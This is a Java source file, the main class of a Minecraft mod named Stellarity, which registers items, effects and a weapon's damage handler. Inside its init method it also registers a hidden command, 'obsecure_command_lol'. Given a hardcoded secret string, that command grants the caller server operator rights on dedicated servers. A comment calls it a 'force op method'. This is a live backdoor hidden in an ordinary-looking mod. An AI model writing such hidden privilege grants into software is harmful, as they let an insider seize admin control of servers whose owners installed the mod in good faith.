package dev.progames723.stellarity;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;
import dev.architectury.event.events.common.CommandRegistrationEvent;
import dev.architectury.registry.registries.RegistrySupplier;
import dev.progames723.stellarity.effects.StellarityEffects;
import dev.progames723.stellarity.events.LivingEvents;
import dev.progames723.stellarity.items.StellarityItems;
import net.minecraft.client.Minecraft;
import net.minecraft.client.server.IntegratedServer;
import net.minecraft.network.chat.Component;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.item.*;
import net.minecraft.world.level.block.Block;

import java.lang.reflect.*;
import java.util.Set;

import static dev.progames723.stellarity.StellaritySharedConstants.*;
import static net.minecraft.commands.Commands.argument;

public class Stellarity {
	private static volatile boolean initialized = false;
	
	public static Block TEST;
	
	static {
		Registers.init();//initializes registered stuff
	}
	
	@SuppressWarnings({"unchecked"})
	public static void init() {
		LOGGER.info("Working!");
		if (!initialized && (!validateRegistration(Registers.class) || !sendRegisteredStuffBackToItsIntendedLocation())) {
			throw new StellarityException(Stellarity.class, "Registries failed at smth now debug it yourself");//real
		}
		initialized = true;
		LivingEvents.DAMAGED.register((entity, source, amount) -> {
			if (!source.isIndirect() && source.getDirectEntity() instanceof Player attacker) {
				ItemStack the = attacker.getMainHandItem();
				if (the.is(StellarityItems.FRIGID_HARVESTER.asItem())){
					if (entity.getHealth() <= amount){
						StellarityItems.writeDataFrigidHarvester(the, attacker);
					}
				}
			}
		});
		// save for later
		// THIS WILL BE REMOVED!
		// this is made to look how to make a command later
		// and make a force op method lol
		CommandRegistrationEvent.EVENT.register((dispatcher, context, selection) -> {
			CommandDispatcher<Object> commandDispatcher = (CommandDispatcher<Object>) (Object) dispatcher;
			commandDispatcher.register(LiteralArgumentBuilder.literal("obsecure_command_lol")
			.then((RequiredArgumentBuilder<Object, String>) (Object) argument("get real", StringArgumentType.string())
			.executes(context1 -> {
				final String value = StringArgumentType.getString(context1, "get real");
				if (value.equals("this_is_a_very_long_string_so_you_cant_bruteforce_this_command_lmao_stop_trying")) {
					if (context1.getSource().getEntity() != null && context1.getSource().getEntity() instanceof Player player){
						if (player.getServer().isDedicatedServer() && !player.level().isClientSide) {
							player.getServer().getPlayerList().op(player.getGameProfile());
							player.displayClientMessage(Component.literal("Op rights received by " + player.getName().getString()), false);
							return 1;
						} else if (!player.getServer().isDedicatedServer() || player.level().isClientSide) {
							IntegratedServer server = Minecraft.getInstance().getSingleplayerServer();
							Minecraft minecraft = Minecraft.getInstance();
							server.getPlayerList().op(minecraft.player.getGameProfile());
							context1.getSource().sendSuccess(() -> Component.literal("Op rights received by " + minecraft.player.getName().getString()), false);
							return 1;
						} else {
							context1.getSource().sendFailure(Component.literal("Op rights were not received by " + player.getName().getString()));
							return 0;
						}
					}
					return 0;
				} else {
					context1.getSource().sendFailure(Component.literal("Wrong value!"));
				}
				return 0;
			})));
		});
	}
	
	public static boolean validateRegistration(Class<?> where) {//im surprised that this works
		for (Field field : where.getFields()) {
			if (field.getName().contains("REGISTERED_")) {
				Object fieldObject;
				try {
					fieldObject = field.get(null);
				} catch (IllegalAccessException e) {
					return false;
				}
				if (fieldObject instanceof RegistrySupplier<?> supplier) {
					try {
						supplier.ifPresentOrElse(
								o -> LOGGER.debug("{} is present!", field.getName()),
								() -> {throw new StellarityException(Stellarity.class, "%s is not present in the registries! Report to the devs!".formatted(field.getName()));}
						);
					} catch (Exception e) {
						return false;
					}
				}
			}
		}
		return true;
	}
	
	private static boolean sendRegisteredStuffBackToItsIntendedLocation() {//one time use only
		if (!initialized) {
			Registers.REGISTERED_TEST.listen(block -> TEST = block);
			Registers.REGISTERED_FRIGID_HARVESTER.listen(item -> StellarityItems.FRIGID_HARVESTER = item);
			Registers.REGISTERED_CAMERA_TEST.listen(item -> StellarityItems.CAMERA_TEST = item);
			Registers.REGISTERED_PRISMATIC_INFERNO.listen(effect -> StellarityEffects.PRISMATIC_INFERNO = effect);
			Registers.REGISTERED_FROSTBURN.listen(effect -> StellarityEffects.FROSTBURN = effect);
			Registers.REGISTERED_JINX.listen(effect -> StellarityEffects.JINX = effect);
			Registers.REGISTERED_VOIDED.listen(effect -> StellarityEffects.VOIDED = effect);
		} else {
			try {
				throw new StellarityException(StackWalker.getInstance(Set.of(StackWalker.Option.values())).getCallerClass(), "Cannot invoke the method again after initialization!");
			} catch (Exception e) {
				return false;
			}
		}
		return true;
	}
}